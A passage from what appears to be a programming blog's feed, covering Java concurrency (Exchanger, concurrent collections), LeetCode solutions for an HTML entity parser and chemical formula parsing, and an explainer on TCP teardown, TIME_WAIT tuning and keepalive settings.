punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">// return;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Exchanger"><a href="#Exchanger" class="headerlink" title="Exchanger"></a>Exchanger</h4><p>It facilitates the exchange of elements between a pair of threads by creating a synchronization point. Two threads share the same Exchanger<E> object. When they <strong>both</strong> arrive at <code>exchanger.exchange((E) object)</code>, they exchange the objects. A typical use for Exchanger would be where one thread is filling a buffer (by reading from a socket) and the other thread is emptying the buffer (by processing the commands received from the socket).</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">FillAndEmpty</span> <span class="token punctuation">{</span>   Exchanger<span class="token operator">&lt;</span>DataBuffer<span class="token operator">></span> exchanger <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exchanger</span><span class="token operator">&lt;</span>DataBuffer<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   DataBuffer initialEmptyBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   DataBuffer initialFullBuffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">class</span> <span class="token class-name">FillingLoop</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       DataBuffer currentBuffer <span class="token operator">=</span> initialEmptyBuffer<span class="token punctuation">;</span>       <span class="token keyword">try</span> <span class="token punctuation">{</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span>currentBuffer <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token function">addToBuffer</span><span class="token punctuation">(</span>currentBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBuffer<span class="token punctuation">.</span><span class="token function">full</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             currentBuffer <span class="token operator">=</span> exchanger<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>currentBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> handle <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span>   <span class="token keyword">class</span> <span class="token class-name">EmptyingLoop</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>     <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       DataBuffer currentBuffer <span class="token operator">=</span> initialFullBuffer<span class="token punctuation">;</span>       <span class="token keyword">try</span> <span class="token punctuation">{</span>         <span class="token keyword">while</span> <span class="token punctuation">(</span>currentBuffer <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token function">takeFromBuffer</span><span class="token punctuation">(</span>currentBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>currentBuffer<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             currentBuffer <span class="token operator">=</span> exchanger<span class="token punctuation">.</span><span class="token function">exchange</span><span class="token punctuation">(</span>currentBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> handle <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span>     <span class="token punctuation">}</span>   <span class="token punctuation">}</span>   <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FillingLoop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">EmptyingLoop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Concurrent-collections"><a href="#Concurrent-collections" class="headerlink" title="Concurrent collections"></a>Concurrent collections</h3><h4 id="Traditional-collections"><a href="#Traditional-collections" class="headerlink" title="Traditional collections"></a>Traditional collections</h4><p>Hashtable and Vector are thread-safe. There are synchronized wrapper factories <code>Collections.synchronizedMap(map)</code>, <code>Collections.synchronizedList(list)</code>, and <code>Collections.synchronizedSet(set)</code>.</p><h4 id="Cooncurrent-API-collections"><a href="#Cooncurrent-API-collections" class="headerlink" title="Cooncurrent API collections"></a>Cooncurrent API collections</h4><p>ConcurrentHashMap, CopyOnWriteArrayList, and CopyOnWriteArraySet, BlockingQueue and Queue. They are better in performance than using synchronized wrappers.</p><p>The iterators returned by java.util.concurrent collections are called weakly consistent iterators. For these classes, if an element has been removed since iteration began, and not yet returned by the next() method, it will not be returned to the caller. If an element has been added since iteration began, it may or may not be returned to the caller. And no element will be returned twice in a single iteration, regardless of how the underlying collection has changed. In short, there is guarantee for delete but not for insert.</p>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode 1410. HTML entity parser</title>
      <link href="/2020/05/23/leetcode-1410-html-entity-parser/"/>
      <url>/2020/05/23/leetcode-1410-html-entity-parser/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> <span class="token function">getMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"&amp;quot;"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"&amp;apos;"</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"&amp;amp;"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"&amp;gt;"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"&amp;lt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"&amp;frasl;"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">entityParser</span><span class="token punctuation">(</span>String text<span class="token punctuation">)</span> <span class="token punctuation">{</span>        HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> map <span class="token operator">=</span> <span class="token function">getMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Stack<span class="token operator">&lt;</span>Integer<span class="token operator">></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>text<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i <span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">char</span> ch <span class="token operator">=</span> text<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">'&amp;'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// record the index</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ch <span class="token operator">==</span> <span class="token string">';'</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> start <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String string <span class="token operator">=</span> sb<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    sb<span class="token punctuation">.</span><span class="token function">delete</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> sb<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TCP teardown</title>
      <link href="/2020/05/22/tcp-teardown/"/>
      <url>/2020/05/22/tcp-teardown/</url>
      
        <content type="html"><![CDATA[<h2 id="Four-way-teardown-process-and-states"><a href="#Four-way-teardown-process-and-states" class="headerlink" title="Four-way teardown process and states"></a>Four-way teardown process and states</h2><p>Either the client or the server initiates the teardown process and tells the counterpart to release the resources. The process is well described in this diagram:</p><p><img src="/2020/05/22/tcp-teardown/tcp_teardown.jpg" alt="TCP teardown"></p><h3 id="Why-is-it-four-way"><a href="#Why-is-it-four-way" class="headerlink" title="Why is it four-way?"></a>Why is it four-way?</h3><p>Let’s say the starting computer is the client.</p><ul><li>When the client sends a <code>FIN</code> packet, the client expresses that it will not send data anymore, however it can receive data.</li><li>When the server receives a <code>FIN</code> packet, the server may have some data that needs to be sent, so it first responds with <code>ACK</code> expressing that it has indeed received the previous packet. Once it has dealt with the remaining data, it sends back a <code>FIN</code> packet.</li></ul><p>The importance of <code>ACK</code> packets is trivial, but why cannot the server just send <code>FIN+ACK</code> just as <code>SYN+ACK</code>? It’s because the server has to allocate some time to send the remaining data.</p><h3 id="Why-TIME-WAIT"><a href="#Why-TIME-WAIT" class="headerlink" title="Why TIME_WAIT?"></a>Why TIME_WAIT?</h3><p>Two reasons:</p><ol><li>Prevent confusion from packets from older connection.</li><li>Ensure the remote TCP received the ack of its connection termination request.</li></ol><h4 id="First-reason"><a href="#First-reason" class="headerlink" title="First reason"></a>First reason</h4><p>Imagine this case: the server sends a packet with <code>seq=301</code>. The client sends a <code>FIN</code> and the whole teardown is finished, however the <code>seq=301</code> packet has not arrived yet. Now the client and the server establishes a new connection with the same port, and the client received the old packet <code>seq=301</code>. Then there is a probability that it creates confusion.</p><h4 id="Second-reason"><a href="#Second-reason" class="headerlink" title="Second reason"></a>Second reason</h4><p>Say the last <code>ACK</code> is lost. The client directly closes. Then the server waits a long time in <code>LAST_ACK</code> state and resends the <code>FIN</code> packet with no response. If there were TIME_WAIT, the server would repeat the <code>FIN</code> packet and the client would send again the <code>ACK</code> (and restart the TIME_WAIT). This helps the server to terminate the connection.</p><h3 id="Why-TIME-WAIT-has-to-be-2MSL"><a href="#Why-TIME-WAIT-has-to-be-2MSL" class="headerlink" title="Why TIME_WAIT has to be 2MSL?"></a>Why TIME_WAIT has to be 2MSL?</h3><p><code>MSL</code> is <strong>Maximum Segment Lifetime</strong>. Firstly, <code>TTL</code> is a parameter in IP protocol, which expresses the maximum number of traversed routers, so when the counters gets to 0, the IP packet is destroyed and an ICMP packet is sent back. As <code>MSL</code> has units of time, <code>MSL</code> is greater or equal to the time needed to decrement <code>TTL</code> to zero.</p><p>So why the client has to wait for 2MSL after receiving the <code>FIN</code> packet? This is to wait for all packets between them to be destroyed. For instance, the server waits the <code>ACK</code> for a long time so it resends the <code>FIN</code> packet. It takes 1MSL time to arrive at the client. The client sends an <code>ACK</code> again, which takes another 1MSL time. So in total it takes 2MSL time.</p><p>In Linux, the 2MSL is defaulted to <code>60</code> seconds, as shown in the kernel code. You can change it and recompile the kernel.</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> TCP_TIMEWAIT_LEN (60*HZ)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Trade-off"><a href="#Trade-off" class="headerlink" title="Trade-off"></a>Trade-off</h4><p>A long TIME_WAIT wastes memory and ports. Check the port range with <code>systemctl net.ipv4.ip_local_port_range</code>.</p><h3 id="TIME-WAIT-optimization"><a href="#TIME-WAIT-optimization" class="headerlink" title="TIME_WAIT optimization"></a>TIME_WAIT optimization</h3><h4 id="Method-1-Reuse-sockets-in-TIME-WAIT-for-dealing-new-connections"><a href="#Method-1-Reuse-sockets-in-TIME-WAIT-for-dealing-new-connections" class="headerlink" title="Method 1: Reuse sockets in TIME_WAIT for dealing new connections"></a>Method 1: Reuse sockets in TIME_WAIT for dealing new connections</h4><p>Set the <code>net.ipv4.tcp_tw_reuse</code> to 1. You would need to apply timestamps too <code>net.ipv4.tcp_timestamps=1(default)</code>. Note that the server and the client time should be synchronized, or maybe the packets will be refused…</p><h4 id="Method-2-Remove-TIME-WAIT-state-by-force-when-full"><a href="#Method-2-Remove-TIME-WAIT-state-by-force-when-full" class="headerlink" title="Method 2: Remove TIME_WAIT state by force when full"></a>Method 2: Remove TIME_WAIT state by force when full</h4><p>By default, the number of sockets in TW above which all TIME_WAIT states would terminate is <code>18000</code>. You can set it in <code>net.ipv4.tcp_max_tw_buckets</code>.</p><h4 id="Method-3-Setting-SO-LINGER-with-timeout-0"><a href="#Method-3-Setting-SO-LINGER-with-timeout-0" class="headerlink" title="Method 3: Setting SO_LINGER with timeout 0"></a>Method 3: Setting SO_LINGER with timeout 0</h4><p>This would skip the 4-way teardown: after calling <code>close()</code> the “active close” sends a <code>RST</code>.</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> linger so_linger<span class="token punctuation">;</span>so_linger<span class="token punctuation">.</span>l_onoff <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>so_linger<span class="token punctuation">.</span>l_linger <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">setsockopt</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> SOL_SOCK<span class="token punctuation">,</span> SO_LINGER<span class="token punctuation">,</span> <span class="token operator">&amp;</span>so_linger<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>so_linger<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Keepalive"><a href="#Keepalive" class="headerlink" title="Keepalive"></a>Keepalive</h2><p>There are three default parameters in Linux:</p><pre><code>net.ipv4.tcp_keepalive_time=7200  --&gt; when no activities after this time, start probing the counterpartnet.ipv4.tcp_keepalive_intlv=75   --&gt; interval between probesnet.ipv4.tcp_keepalive_probes=9   --&gt; number of probes before cutting connection</code></pre><p>Computing this, we get that a Linux OS would have to wait for <code>2h 11min 15s</code> before discovering that the connection is dead.</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> networking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java regex: Leetcode 726. Number of Atoms</title>
      <link href="/2020/05/22/java-regex-leetcode-726-number-of-atoms/"/>
      <url>/2020/05/22/java-regex-leetcode-726-number-of-atoms/</url>
      
        <content type="html"><![CDATA[<p>This challenge asks to parse a chemical formula. A parsing problem immediately makes me think of regular expressions. They are really helpful! All defined patterns are grouped in order of appearance. Isn’t it marvelous? Let’s compare a hand parsing method and a regex method. The logic is easy, so what makes this problem hard is that there are a handful of different patterns to look for. But it is a lot easier if you master the <code>java.util.regex</code> package!</p><h4 id="Recursive-method-and-hand-parsing"><a href="#Recursive-method-and-hand-parsing" class="headerlink" title="Recursive method and hand parsing"></a>Recursive method and hand parsing</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">countOfAtoms</span><span class="token punctuation">(</span>String formula<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> map <span class="token operator">=</span> <span class="token function">getMap</span><span class="token punctuation">(</span>formula<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// structure the return string</span>        StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>String atom <span class="token operator">:</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>atom<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>atom<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">?</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>atom<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">""</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">findClosedParenthesis</span><span class="token punctuation">(</span>String s<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>start<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'('</span><span class="token punctuation">)</span> count<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">')'</span><span class="token punctuation">)</span> count<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> i<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token keyword">private</span> TreeMap <span class="token function">getMap</span><span class="token punctuation">(</span>String formula<span class="token punctuation">)</span> <span class="token punctuation">{</span>        TreeMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> map<span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> formula<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// starting an embedded formula, so apply recursion</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'('</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token function">findClosedParenthesis</span><span class="token punctuation">(</span>formula<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> submap <span class="token operator">=</span> <span class="token function">getMap</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                j<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// find the multiple of the embedded formula</span>                <span class="token keyword">int</span> k <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>k <span class="token operator">&lt;</span> formula<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Character<span class="token punctuation">.</span><span class="token function">isDigit</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> k<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> mul <span class="token operator">=</span> k <span class="token operator">></span> j<span class="token operator">?</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// add it to map</span>                <span class="token keyword">for</span><span class="token punctuation">(</span>String atom <span class="token operator">:</span> submap<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>atom<span class="token punctuation">,</span> submap<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>atom<span class="token punctuation">)</span><span class="token operator">*</span>mul <span class="token operator">+</span> map<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>atom<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                i <span class="token operator">=</span> k<span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">&lt;</span>formula<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> formula<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">>=</span><span class="token string">'a'</span> <span class="token operator">&amp;&amp;</span> formula<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token string">'z'</span><span class="token punctuation">)</span> j<span class="token operator">++</span><span class="token punctuation">;</span>                String atom <span class="token operator">=</span> formula<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> k <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token 